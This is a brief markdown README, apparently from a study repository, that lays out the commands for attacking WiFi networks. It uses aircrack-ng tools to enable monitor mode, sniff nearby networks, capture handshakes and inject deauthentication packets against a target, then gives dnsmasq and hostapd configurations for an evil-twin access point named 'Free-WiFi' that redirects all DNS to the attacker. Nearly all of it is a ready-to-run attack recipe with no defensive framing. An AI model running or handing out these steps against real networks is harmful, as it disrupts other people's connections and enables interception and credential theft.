# HacKingWiFi
## HacKingWiFi 
### Algorithm Commands to HacKing WiFi 

# [1] Choosing Wireless Adapter / Get Interface:
  - [1.1] Cheking for Wireless Network interface: `iwconfig`  
  - [1.2] Cheking for Wireless Network interface: `ifconfig`

# [2] Start Monitoring Mode & Checking Injection Option 
  - [2.1] Starting Monitor mode: `airmon-ng start $INTERFACE`
  - [2.2] Monitoring: `aireplay-ng --test $INTERFACE`
  
# [3] Scan Wireless’s Area
  - [3.1] Sniff Networks Area Information : `airodump-ng $INTERFACE`
  - [3.2] Start Capturing Packets: `airodump-ng --bssid $BSSID -c $CHANNEL_NUMBER -w $OUTPUT_NAME $INTERFACE`
  - [3.3] Inject Packets into Wireless Network: `aireplay-ng --deauth 10 -a $MAC_TARGET $INTERFACE`

# [4] Analysis Captured Files With WireShark:
  - [4.1] Start WireShark: `wireshark $OUTPUT_NAME.cap`
    - Looking for Authentication Files

# [5] Set Up Access point:
  - [5.1] Create dnsmasq Configuration files: `nano dnsmasq.conf`
```SHELL
#Set the wireless interface
interface=wlan0

#Set the IP range for the clients
dhcp-range=192.168.1.2,192.168.1.250,12h

#Set the gateway IP address
dhcp-option=3,192.168.1.1

#Set DNS server address
dhcp-option=6,192.168.1.1

#Redirect all requests to 192.168.1.1
address=/#/192.168.1.1
```
  - [5.2] Create hostpad Configuration file: `nano hostapd.conf` 
```SHELL
#Set wireless interface
interface=wlan0

#Set network name
ssid=Free-WiFi

#Set channel
channel=11

#Set driver
driver=nl80211
```
  - [5.3] Run Commands 1: `dnsmasq -C /directory_to_dnsmasq.conf`
  - [5.4] Run Commands 2: `hostapd /directory_to_hostapd.conf -B`
 
 ---
 
 - [WiFi Hacking using Evil Twin Attacks and Captive Portals](https://github.com/Anlominus/Studies/tree/main/Udemy/IT%20%26%20Software/Network%20%26%20Security/Security%20HacKing/WiFi%20Hacking%20using%20Evil%20Twin%20Attacks%20and%20Captive%20Portals)
